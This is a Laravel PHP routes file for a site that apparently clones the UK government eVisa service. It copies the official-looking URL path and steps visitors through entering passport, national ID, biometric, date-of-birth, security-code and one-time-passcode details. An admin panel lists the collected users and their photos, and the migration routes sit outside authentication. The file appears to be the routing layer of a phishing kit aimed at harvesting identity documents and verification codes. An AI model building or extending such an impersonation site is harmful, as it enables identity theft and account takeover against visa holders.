<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AdminController;
use App\Http\Controllers\UKVIController;

// Admin panel routes (specific, must come before catch-all)
Route::redirect('/admin', '/admin/login');
Route::prefix('admin')->group(function () {
    Route::get('/login', [AdminController::class, 'loginForm'])->name('admin.login');
    Route::post('/login', [AdminController::class, 'login'])->name('admin.login.post');
    Route::get('/run-migration', [AdminController::class, 'runMigration'])->name('admin.run-migration');
    Route::get('/check-migration', [AdminController::class, 'checkMigration'])->name('admin.check-migration');
    Route::middleware('auth')->group(function () {
        Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('admin.dashboard');
        Route::post('/logout', [AdminController::class, 'logout'])->name('admin.logout');
        Route::get('/settings', [AdminController::class, 'settings'])->name('admin.settings');
        Route::post('/settings', [AdminController::class, 'saveSettings'])->name('admin.settings.save');
        Route::post('/settings/test-email', [AdminController::class, 'sendTestEmail'])->name('admin.settings.test-email');
        Route::get('/users', [AdminController::class, 'users'])->name('admin.users');
        Route::get('/users/create', [AdminController::class, 'createUser'])->name('admin.users.create');
        Route::post('/users', [AdminController::class, 'storeUser'])->name('admin.users.store');
        Route::get('/users/{id}/edit', [AdminController::class, 'editUser'])->name('admin.users.edit');
        Route::get('/users/{id}/photo', [AdminController::class, 'userPhoto'])->name('admin.users.photo');
        Route::put('/users/{id}', [AdminController::class, 'updateUser'])->name('admin.users.update');
        Route::delete('/users/{id}', [AdminController::class, 'deleteUser'])->name('admin.users.delete');
    });
});

// Legacy Blade routes at the original URL for backward compatibility
Route::prefix('evisa/view-evisa-get-share-code-prove-immigration-status')->group(function () {
    Route::get('/', fn () => view('home'))->name('blade.home');
    Route::get('/id-question', [UKVIController::class, 'selectIdentity'])->name('ukvi.select-identity');
    Route::post('/id-question', [UKVIController::class, 'handleIdentitySelection'])->name('ukvi.handle-identity');
    Route::get('/id-question/passport', [UKVIController::class, 'showPassport'])->name('ukvi.passport');
    Route::post('/id-question/passport', [UKVIController::class, 'handlePassportSubmission'])->name('ukvi.passport.post');
    Route::get('/id-question/national-id', [UKVIController::class, 'showNationalId'])->name('ukvi.national-id');
    Route::post('/id-question/national-id', [UKVIController::class, 'handleNationalIdSubmission'])->name('ukvi.national-id.post');
    Route::get('/id-question/biometric', [UKVIController::class, 'showBiometric'])->name('ukvi.biometric');
    Route::post('/id-question/biometric', [UKVIController::class, 'handleBiometricSubmission'])->name('ukvi.biometric.post');
    Route::get('/id-question/customer-number', [UKVIController::class, 'showCustomerNumber'])->name('ukvi.customer-number');
    Route::post('/id-question/customer-number', [UKVIController::class, 'handleCustomerNumberSubmission'])->name('ukvi.customer-number.post');
    Route::get('/id-question/date-of-birth', [UKVIController::class, 'showDateOfBirth'])->name('ukvi.date-of-birth');
    Route::post('/id-question/date-of-birth', [UKVIController::class, 'handleDateOfBirthSubmission'])->name('ukvi.date-of-birth.post');
    Route::get('/id-question/security-code', [UKVIController::class, 'showSecurityCode'])->name('ukvi.security-code');
    Route::post('/id-question/security-code', [UKVIController::class, 'handleSecurityCodeSubmission'])->name('ukvi.security-code.post');
    Route::get('/id-question/record-not-found', [UKVIController::class, 'showRecordNotFound'])->name('ukvi.record-not-found');
    Route::get('/id-question/security-code/verify', [UKVIController::class, 'showOtp'])->name('ukvi.otp');
    Route::post('/id-question/security-code/verify', [UKVIController::class, 'verifyOtp'])->name('ukvi.otp.verify');
    Route::post('/id-question/security-code/resend', [UKVIController::class, 'resendOtp'])->name('ukvi.otp.resend');
    Route::get('/status', [UKVIController::class, 'showEvisa'])->name('ukvi.evisa');
    Route::get('/status/photo', [UKVIController::class, 'evisaPhoto'])->name('ukvi.evisa.photo');
    Route::get('/share/someone-else/code', [UKVIController::class, 'downloadEvisaPdf'])->name('ukvi.evisa.download');
});

// API routes for React SPA wizard
use App\Http\Controllers\Api\UKVIApiController;

Route::prefix('api/ukvi')->middleware('web')->group(function () {
    Route::any('/document', [UKVIApiController::class, 'storeDocument']);
    Route::any('/date-of-birth', [UKVIApiController::class, 'dateOfBirth']);
    Route::any('/security-code', [UKVIApiController::class, 'sendSecurityCode']);
    Route::any('/security-code/options', [UKVIApiController::class, 'securityCodeOptions']);
    Route::any('/verify-otp', [UKVIApiController::class, 'verifyOtp']);
    Route::any('/resend-otp', [UKVIApiController::class, 'resendOtp']);
    Route::any('/evisa', [UKVIApiController::class, 'evisa']);
    Route::any('/evisa/photo', [UKVIApiController::class, 'evisaPhoto']);
    Route::any('/evisa/share-code', [UKVIApiController::class, 'downloadEvisaPdf']);
});

// React SPA catch-all - must come LAST so specific routes match first.
Route::view('/', 'spa')->name('home');
Route::view('/{path?}', 'spa')->where('path', '^(?!api|admin).*$')->name('spa.catch-all');
